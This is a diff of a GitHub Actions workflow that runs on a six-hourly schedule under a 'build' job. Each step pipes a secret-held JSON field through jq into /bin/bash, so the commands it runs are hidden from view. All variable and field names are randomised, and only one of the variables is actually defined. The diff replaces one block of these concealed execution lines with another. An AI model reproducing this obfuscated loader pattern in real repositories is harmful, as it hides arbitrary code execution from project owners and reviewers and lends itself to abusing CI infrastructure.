@@ -2,31 +2,25 @@ name: yutongren5423
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
-
+    - cron: '45 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yutongren5423
         env:
-          szbbe02: ${{ secrets.szbbe02 }}
+          vaee38: ${{ secrets.vaee38 }}
         run: |
-          echo $szbbe02 | jq -r .il90914 | /bin/bash
-          echo $ufn70 | jq -r .falqa3 | /bin/bash
-          echo $xqr77900 | jq -r .elzwa847 | /bin/bash
-          echo $grpbo14 | jq -r .rgg6 | /bin/bash
-          echo $shpi08 | jq -r .u37118 | /bin/bash
-          echo $xbpv77 | jq -r .rf63 | /bin/bash
-          echo $e74 | jq -r .nupu684 | /bin/bash
-          echo $grr34 | jq -r .qditb75030 | /bin/bash
-          echo $tq3 | jq -r .ur4 | /bin/bash
-          echo $lg6777 | jq -r .jrb098 | /bin/bash
-          echo $ilxjr4 | jq -r .zrdiw64542 | /bin/bash
-          echo $ru6 | jq -r .fnn09607 | /bin/bash
-          echo $hpuxw486 | jq -r .u79 | /bin/bash
-          echo $f1147 | jq -r .hywsa9 | /bin/bash
-          echo $vhz53416 | jq -r .l575 | /bin/bash
-          echo $oezwk12986 | jq -r .cvtao627 | /bin/bash
+          echo $vaee38 | jq -r .vdbk7 | /bin/bash
+          echo $m79471 | jq -r .imnop3745 | /bin/bash
+          echo $hkjxd1441 | jq -r .ilywk28 | /bin/bash
+          echo $ugc2 | jq -r .qej4571 | /bin/bash
+          echo $kxkvt3421 | jq -r .dqvjf88 | /bin/bash
+          echo $ku54 | jq -r .g6 | /bin/bash
+          echo $lkstl07733 | jq -r .dadmc078 | /bin/bash
+          echo $wcuf6950 | jq -r .p4 | /bin/bash
+          echo $yn459 | jq -r .trqrm8 | /bin/bash
+          echo $i721 | jq -r .rn4 | /bin/bash
 
